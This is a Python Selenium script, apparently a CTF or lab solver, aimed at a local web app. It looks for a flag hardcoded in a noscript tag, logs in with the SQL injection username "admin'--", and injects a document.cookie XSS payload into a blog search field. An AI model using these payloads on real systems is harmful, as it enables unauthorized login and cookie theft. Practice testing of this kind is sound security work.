from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By

# 크롬 드라이버 설정
def init_driver():
    options = webdriver.ChromeOptions()
    options.add_argument('--headless')  # 창을 띄우지 않고 실행하고 싶으면 주석 해제
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--disable-gpu')
    return webdriver.Chrome(options=options)

# 특정 input 찾기 (placeholder 기준)
def find_input_by_placeholder(driver, placeholder_text):
    inputs = WebDriverWait(driver, 10).until(
        EC.presence_of_all_elements_located((By.CSS_SELECTOR, 'input'))
    )
    for elem in inputs:
        if placeholder_text in (elem.get_attribute("placeholder") or ""):
            return elem
    return None

# 로그인 함수
def login(driver, url, username, password):
    driver.get(url)

    # noscript 태그 내 플래그 확인
    noscript = driver.find_element(By.XPATH, "/html/body/noscript")
    content = noscript.get_attribute("textContent").strip()
    if any(keyword in content.lower() for keyword in ["flag", "ctf"]):
        print('[취약점]')
        print(f"hardcoding : {content}")
        with open("hardcoding_vuln.txt", "w", encoding="utf-8") as f:
            f.write(f"[FLAG DETECTED] {content}\n")

    # 아이디/비밀번호 입력
    id_input = find_input_by_placeholder(driver, "아이디(학번)를 입력해주세요")
    pw_input = find_input_by_placeholder(driver, "비밀번호를 입력해주세요")

    if not id_input or not pw_input:
        raise Exception("아이디 또는 비밀번호 입력창을 찾을 수 없습니다.")

    id_input.clear()
    id_input.send_keys(username)
    pw_input.clear()
    pw_input.send_keys(password)

    # 로그인 버튼 클릭
    login_button = WebDriverWait(driver, 10).until(
        EC.element_to_be_clickable((By.XPATH, '//*[@id="root"]/div/main/div/div/div/div/form/button'))
    )
    driver.execute_script("arguments[0].click();", login_button)

    # 로그인 결과 메시지 출력
    flag_message = WebDriverWait(driver, 10).until(
        EC.visibility_of_element_located((By.XPATH, '//*[@id="root"]/div/main/div/div/div/div/form/p'))
    )
    print("sql_injection :", flag_message.text)

# XSS 테스트 함수
def test_xss(driver, url, payload):
    driver.get(url)
    search_input = find_input_by_placeholder(driver, "검색어를 입력하세요")

    if not search_input:
        raise Exception("검색창을 찾을 수 없습니다.")

    search_input.clear()
    search_input.send_keys(payload)

    # alert 발생 시 텍스트 출력
    alert = driver.switch_to.alert
    print(f"xss : {alert.text}")

# 메인 실행
if __name__ == "__main__":
    driver = init_driver()
    try:
        login_url = 'http://127.0.0.1:3000/users/login'
        blog_url = 'http://127.0.0.1:3000/blog'

        login(driver, login_url, "admin'--", "1234")
        test_xss(driver, blog_url, '<img src="x" onerror="alert(document.cookie)">')

    finally:
        driver.quit()
